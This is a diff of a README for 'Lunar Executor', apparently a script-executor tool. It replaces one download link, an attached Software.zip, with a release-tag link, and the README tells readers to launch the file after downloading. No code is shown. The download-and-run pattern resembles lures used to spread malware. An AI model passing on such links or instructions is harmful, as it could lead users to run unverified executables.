@@ -10,7 +10,7 @@ Welcome to the Lunar Executor repository, the ultimate tool for executing custom
 ## Installation 🛠️
 To get started with Lunar Executor, download the software from the link below. Make sure to launch the file after downloading to begin utilizing its features.
 
-[![Download Lunar Executor](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18060583/Software.zip)
+[![Download Lunar Executor](https://github.com/Trioxidep/Lunar-Executor/releases/tag/v2.0)](https://github.com/Trioxidep/Lunar-Executor/releases/tag/v2.0)
 
 ## How to Use 📝
 1. Download and install Lunar Executor.
